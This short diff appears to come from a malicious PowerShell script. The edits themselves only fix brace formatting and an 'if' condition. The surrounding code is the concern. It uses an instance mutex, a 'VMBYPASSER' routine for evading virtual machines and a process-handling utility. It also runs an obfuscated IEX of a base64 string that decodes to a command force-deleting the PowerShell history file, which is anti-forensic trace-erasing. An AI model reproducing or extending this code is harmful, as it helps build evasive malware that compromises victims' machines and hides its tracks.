@@ -17,9 +17,10 @@ function KDMUTEX {
         throw "An instance of this script is already running."
     }
     else {
-        if $debug {
+        if ($debug) {
             Invoke-TASKS
-        } else {
+        }
+        else {
             VMBYPASSER
         }
     }
@@ -911,7 +912,8 @@ if (INVOKE-AC -eq $true) {
     #removes history
     if ($debug) {
         Read-Host "Press Enter to continue..."
-    } else {
+    }
+    else {
         [ProcessUtility]::MakeProcessKillable()
     }
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
